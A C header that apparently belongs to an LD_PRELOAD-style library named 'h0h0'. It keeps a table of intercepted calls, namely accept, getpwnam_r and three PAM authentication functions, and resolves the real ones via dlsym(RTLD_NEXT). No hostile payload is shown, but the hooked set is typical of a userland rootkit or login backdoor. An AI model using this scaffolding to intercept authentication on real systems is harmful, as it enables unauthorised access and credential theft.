#ifndef H0H0_LIBCALLS_H
#define H0H0_LIBCALLS_H

#include "h0h0.h"

typedef const int (*libcall)();

/* Libcall hash. */
struct lc_hash
{
    const char *name;
    libcall callback;
};

// Dummy libcall to avoid potential segfaults
int dummy() { debug("Dummy: Looks like you called an invalid libcall.\n"); }

/* Get libcall by name. */
libcall getlibcall(const char *name)
{
    /* Libcall table. */
    static struct lc_hash libcalls[] = \
    {
        {.name = "accept"           },
        {.name = "getpwnam_r"       },
        {.name = "pam_authenticate" },
        {.name = "pam_open_session" },
        {.name = "pam_acct_mgmt"    }
    };
    static size_t num_libcalls = sizeof(libcalls) / sizeof(libcalls[0]);

    /* Search for libcall. */
    for (int i = 0; i < num_libcalls; i++)
    {
        if (strcmp(name, libcalls[i].name) == 0)
        {
            /* Find libcall address. */ 
            if (libcalls[i].callback == NULL)
                if ((libcalls[i].callback = dlsym(RTLD_NEXT, name)) == NULL)
                    return dummy;

            return libcalls[i].callback;
        }
    }

    return dummy;
}

#endif // H0H0_LIBCALLS_H
